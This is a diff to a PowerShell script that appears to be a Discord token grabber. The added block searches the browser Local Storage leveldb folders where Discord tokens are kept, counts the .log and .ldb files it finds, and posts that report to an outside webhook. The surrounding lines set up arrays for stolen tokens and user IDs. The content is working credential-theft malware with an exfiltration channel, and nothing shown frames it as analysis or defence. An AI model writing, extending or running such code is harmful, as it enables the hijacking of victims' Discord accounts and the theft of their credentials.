@@ -18,6 +18,21 @@ $paths = @{
     'Brave' = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb\"
 }
 
+# Send debug info first
+$debugInfo = "Searching for Discord tokens...`nPaths checked:`n"
+foreach ($name in $paths.Keys) {
+    $path = $paths[$name]
+    $debugInfo += "- $name`: $path`n"
+    if (Test-Path $path) {
+        $files = Get-ChildItem $path -Filter "*.log","*.ldb" -ErrorAction SilentlyContinue
+        $debugInfo += "  Found $($files.Count) files`n"
+    } else {
+        $debugInfo += "  Path not found`n"
+    }
+}
+$body = @{content=$debugInfo} | ConvertTo-Json
+Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json"
+
 $tokens = @()
 $uids = @()
 
